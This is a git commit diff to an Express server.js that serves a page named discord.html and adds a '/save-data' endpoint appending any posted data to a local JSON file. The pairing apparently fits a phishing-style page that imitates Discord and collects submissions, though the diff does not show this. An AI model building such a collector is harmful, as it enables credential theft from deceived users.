7e28a16b92ae37fc4af19b6e120a639ffad0c6a3
CopyOfClarimond <berko.itay@gmail.com>
2024-08-02 19:17:33 +0545

    Update server.js

--- server.js
+++ server.js
@@ -13,6 +13,28 @@ app.get("/", (req, res) => {
 	res.sendFile(path.join(__dirname, "public", "discord.html"));
 });
 
+app.post("/save-data", (req, res) => {
+	const data = req.body;
+	const filePath = path.join(__dirname, "meow.json");
+
+	fs.readFile(filePath, "utf8", (err, fileData) => {
+		let jsonData = [];
+
+		if (!err && fileData) {
+			jsonData = JSON.parse(fileData);
+		}
+		jsonData.push(data);
+		fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), "utf8", (err) => {
+			if (err) {
+				console.error("Error writing to file:", err);
+				res.status(500).send("Error saving data");
+			} else {
+				res.send("Data saved successfully");
+			}
+		});
+	});
+});
+
 app.listen(port, () => {
 	console.log(`✅ Server is running on http://localhost:${port}`);
 });
